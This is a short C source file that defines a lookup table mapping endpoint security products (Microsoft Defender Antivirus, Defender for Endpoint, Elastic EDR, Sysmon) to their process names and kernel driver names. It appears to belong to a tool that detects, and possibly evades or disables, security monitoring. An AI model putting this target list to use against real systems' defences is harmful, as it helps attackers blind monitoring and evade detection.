#include "common.h"

EDR_MAP g_EDRMap[] = {
	{
		L"Microsoft Defender Antivirus",
		{
			L"MsMpEng.exe",                 // AV service
			L"NisSrv.exe",                  // Network Inspection Service
			L"MpDefenderCoreService.exe",   // Core platform service
			L"smartscreen.exe",             // SmartScreen
			NULL
		},
		{
			L"WdFilter.sys",
			NULL
		}
	},

	{
		L"Microsoft Defender for Endpoint",
		{
			L"MsSense.exe",                 // Sensor service
			L"SenseIR.exe",                 // IR process
			L"SenseNdr.exe",                // Network Detection and Response
			L"SenseCncProxy.exe",           // CNC proxy
			L"SenseSampleUploader.exe",     // Sample uploader
			L"SenseTVM.exe",                // Threat & Vulnerability Management
			NULL
		},
		{
			L"MsSecFlt.sys"
		}
	},

	{
		L"Elastic EDR",
		{
			L"elastic-agent.exe",       // Core Elastic Agent 
			L"elastic-endpoint.exe",    // Elastic Endpoint Security (EDR component)
			L"filebeat.exe",            // Collects and ships log files
			L"metricbeat.exe",          // Collects system and service metrics
			L"winlogbeat.exe",          // Collects Windows Event Logs
			NULL
		},
		{
			L"elastic-endpoint-driver.sys",
			NULL
		}
	},

	{
		L"Sysmon",
		{
			L"Sysmon.exe",
			NULL
		},
		{
			L"SysmonDrv.sys",
			NULL
		}
	}
};

const SIZE_T g_EDRCount = sizeof(g_EDRMap) / sizeof(g_EDRMap[0]);